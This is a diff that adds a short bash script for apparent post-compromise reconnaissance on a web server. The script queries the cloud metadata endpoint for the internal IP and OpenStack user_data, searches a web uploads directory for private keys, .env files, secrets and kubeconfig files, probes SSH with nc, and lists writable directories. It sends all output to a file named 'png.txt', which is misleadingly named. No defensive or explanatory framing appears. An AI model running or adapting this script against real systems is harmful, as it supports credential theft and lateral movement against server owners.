@@ -1,0 +1,17 @@
+#!/bin/bash
+exec > png.txt 2>&1
+
+LOCAL_IP=$(curl -s http://169.254.169.254/latest/meta-data/local-ipv4)
+echo "Host Internal IP: $LOCAL_IP"
+
+echo "=== user_data ==="
+curl -s http://169.254.169.254/openstack/latest/user_data
+
+echo "=== Searching for SSH keys and configs in object storage ==="
+find /var/www/project/web/uploads -type f \( -name "*.pem" -o -name "*.key" -o -name "id_rsa" -o -name "authorized_keys" -o -name ".env" -o -name "*secret*" -o -name "kubeconfig" \) 2>/dev/null | head -20
+
+echo "=== Testing SSH port 22 ==="
+timeout 2 nc -zv $LOCAL_IP 22 2>&1
+
+echo "=== Writable directories ==="
+find / -type d -writable 2>/dev/null | grep -v -E "proc|sys|dev|run/secrets" | head -10
